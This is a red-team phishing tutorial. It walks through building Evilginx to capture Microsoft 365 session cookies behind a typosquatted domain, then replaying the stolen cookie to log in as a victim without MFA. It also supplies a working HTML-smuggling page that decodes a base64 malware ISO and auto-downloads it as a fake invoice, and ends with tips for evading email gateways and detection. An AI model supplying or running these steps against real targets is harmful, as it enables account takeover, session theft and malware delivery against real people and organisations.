---
title: Phishing Operations
tags: [phishing, social-engineering, evilginx, payload-delivery, html-smuggling]
description: The ultimate guide to Red Team phishing, from setting up Evilginx infrastructure to HTML smuggling and gateway evasion.
date: 2024-01-02
---

# Phishing Operations (T1566)

Phishing is the art of convincing a user to do something dangerous (click a link, download an attachment, enter credentials). For a Red Team, it is the primary method of Initial Access.

This guide takes you from **Novice** concepts to **Expert** implementation.

---

## Part 1: Credential Harvesting (Adversary-in-the-Middle)

**The Problem**: MFA (Multi-Factor Authentication) stops traditional credential harvesting. Dealing with `username + password` is useless if you don't have the SMS/App code.

**The Solution**: AiTM (Adversary-in-the-Middle). We don't steal the password; we steal the **Session Cookie**.

### Tool: Evilginx3
Evilginx sits between the victim and the real website (e.g., Microsoft 365). It proxies the traffic.
1.  Victim sees your domain (`outlook-secure.com`).
2.  Evilginx fetches the real `login.microsoftonline.com`.
3.  Victim enters creds + MFA. Evilginx passes them to Microsoft.
4.  Microsoft sends back the **ESTSAUTH** cookie (Session Token).
5.  Evilginx captures this cookie. **GAME OVER.**

### Setup Guide (Novice to Expert)

#### 1. Infrastructure Setup
You need a VPS (Ubuntu) and a Domain.
```bash
# Install Go
sudo apt install golang-go

# Clone & Build Evilginx
git clone https://github.com/kgretzky/evilginx2
cd evilginx2
make
```

#### 2. Domain & DNS
Purchase a domain that looks like your target.
- Target: `company.com`
- You Buy: `cornpany.com` (Typosquatting) or `company-sso.com`.

**DNS A Records** (Point all to your VPS IP):
- `ns1.cornpany.com`
- `www.cornpany.com`
- `login.cornpany.com`

#### 3. Configuration (The Phishlet)
A "Phishlet" is a YAML config telling Evilginx how to proxy the target site. (Find community phishlets on GitHub).

```bash
sudo ./evilginx

# Config
config domain cornpany.com
config ip <VPS_IP>

# Load Phishlet (e.g., o365)
phishlets hostname o365 login.cornpany.com
phishlets enable o365
```

#### 4. The Lure
Evilginx generates a link: `https://login.cornpany.com/search?k=xyz`.
Send this to the victim.

### Expert Tip: Post-Exploitation
Once you have the cookie (printed in Evilginx terminal), verify it immediately.
- Use the **Cookie Editor** extension in Firefox.
- Go to `portal.office.com`.
- Clear cookies -> Import Evilginx cookies.
- Refresh. **You are logged in as the CEO without MFA.**

---

## Part 2: Payload Delivery (Getting a Shell)

Sometimes credentials aren't enough. You need code execution (C2 Beacon).

### Technique: HTML Smuggling (Bypass Email Gateways)
Email Gateways (Proofpoint) scan attachments. They inspect `evil.exe` or `malware.zip`.
**HTML Smuggling** builds the file *inside the browser*. The file does not exist on the wire.

#### Implementation
Create an HTML file (`invoice.html`) with this JavaScript:

```html
<html>
<body>
    <h3>Downloading Secure Invoice...</h3>
    <script>
        // Use a tool like output base64 of your malware.iso
        var b64file = "TVqQAAMAAAAEAAAA//8AALg........(LOTS OF BASE64)";
        
        function base64ToBlob(b64Data, contentType) {
            contentType = contentType || '';
            var sliceSize = 512;
            var byteCharacters = atob(b64Data);
            var byteArrays = [];
            for (var offset = 0; offset < byteCharacters.length; offset += sliceSize) {
                var slice = byteCharacters.slice(offset, offset + sliceSize);
                var byteNumbers = new Array(slice.length);
                for (var i = 0; i < slice.length; i++) {
                    byteNumbers[i] = slice.charCodeAt(i);
                }
                var byteArray = new Uint8Array(byteNumbers);
                byteArrays.push(byteArray);
            }
            return new Blob(byteArrays, {type: contentType});
        }

        var blob = base64ToBlob(b64file, 'application/octet-stream');
        var blobUrl = URL.createObjectURL(blob);
        
        // Auto-download
        var a = document.createElement('a');
        a.href = blobUrl;
        a.download = "Invoice_Q4_2024.iso";
        document.body.appendChild(a);
        a.click();
    </script>
</body>
</html>
```

### Why .ISO or .IMG?
Windows treats ISOs as drives. When a user double-clicks `Invoice.iso`:
1.  Windows mounts it as `D:`.
2.  Windows does **NOT** propagate the "Mark of the Web" (MotW) to files inside ISOs (historically).
3.  The user clicks the shortcuts inside.

---

## Part 3: Evasion Checklist (Don't Get Caught)

1.  **DKIM/SPF/DMARC**: Essential. If your sending domain fails these, you go to Spam. Use `mail-tester.com` to verify score is 10/10.
2.  **Domain Age**: Buy domains 2-4 weeks in advance. "Newly Registered Domains" (NRD) are blocked by corporate proxies.
3.  **Geo-Fencing**: Configure your web server (Nginx/Apache) to ONLY serve the payload if the IP comes from the target's country. Everyone else gets a 404.
4.  **Click Tracking**: Do not use generic trackers (bit.ly). They are flagged. Host your own analytics.
